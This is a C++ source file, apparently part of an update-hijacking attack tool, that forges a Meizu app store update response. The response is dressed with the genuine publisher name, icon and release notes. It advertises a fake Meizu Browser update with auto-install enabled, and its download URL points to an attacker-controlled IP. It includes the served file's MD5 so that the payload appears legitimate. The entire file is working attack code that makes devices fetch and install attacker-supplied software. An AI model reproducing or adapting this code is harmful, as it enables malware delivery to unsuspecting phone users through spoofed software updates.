


#include "MeizuUpdate.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


int MeizuUpdate::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;

	string vername = "7.3.3";
	int version = 7003003;

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=gbk\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{ \"code\":200,\"message\" : \"\",\"redirect\" : \"http://%s/%s\",\"value\" : "
		"[{\"auto_install\":1,\"category_id\" : 1,\"category_name\" : \"系统工具\","
		"\"digest\" : \"%s\",\"evaluate_count\" : 6371,"			//36997e0f003ae2401ca2877bb303c939
		"\"icon\" : \"http://i3.res.meizu.com/fileserver/app_icon/9465/af19c5ecdc23455b8b29e481b3c268bb.png\","
		"\"id\" : 3075887,\"install_time\" : null,\"is_latest_version\" : 0,"
		"\"name\" : \"魅族浏览器\",\"package_name\" : \"com.android.browser\","
		"\"price\" : 0.00,\"publisher\" : \"魅族科技\",\"size\" : %u,\"star\" : 26,"
		"\"update_description\" : \"小七这次更新了几个贴心好用的功能\r\n\r\n· 优化首页布局，找导航看资讯都方便\r\n· 浏览网页出错时自动定位原因                          \r\n· 可设置启动时不恢复上次访问网页\r\n· 支持记住账号密码，下次一键登录\r\n\r\n赶紧更新吧~\","
		"\"url\" : \"%s/%s\",\"version_code\" : %u,\"version_create_time\" : 1528536749713,"		///apps/public/detail/3075887
		"\"version_name\" : \"%s\",\"version_patch_md5\" : null,\"version_patch_size\" : null}] }";



	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		szip.c_str(), filename.c_str(), m_szmd5, m_filesize,szip.c_str(), filename.c_str(),version,vername.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;

}
